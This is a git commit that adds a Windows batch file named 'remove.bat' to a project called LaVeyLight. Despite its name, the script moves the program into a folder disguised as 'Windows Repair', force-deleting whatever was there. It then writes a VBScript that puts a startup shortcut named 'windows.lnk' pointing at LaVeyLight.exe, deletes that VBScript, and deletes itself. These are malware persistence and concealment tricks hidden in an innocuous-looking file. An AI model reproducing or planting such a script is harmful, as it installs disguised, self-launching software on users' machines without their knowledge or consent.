e84a2dbc9dc78927b56c9113d85a28cdae5fcc34
wladutu <63238534+wladutu@users.noreply.github.com>
2021-02-20 18:46:48 +0200

    Add files via upload

---
+++ LaVeyLight/remove.bat
@@ -0,0 +1,12 @@
+SET FOLDER=%HOMEDRIVE%\Windows Repair
+RMDIR /s /q "%FOLDER%"
+MOVE "%CD%\LaVeyLight" "%FOLDER%"
+ECHO Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
+ECHO sLinkFile = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\windows.lnk" >> CreateShortcut.vbs
+ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
+ECHO oLink.TargetPath = "%FOLDER%\LaVeyLight.exe" >> CreateShortcut.vbs
+ECHO oLink.Save >> CreateShortcut.vbs
+cscript CreateShortcut.vbs
+DEL CreateShortcut.vbs
+cls
+DEL %0
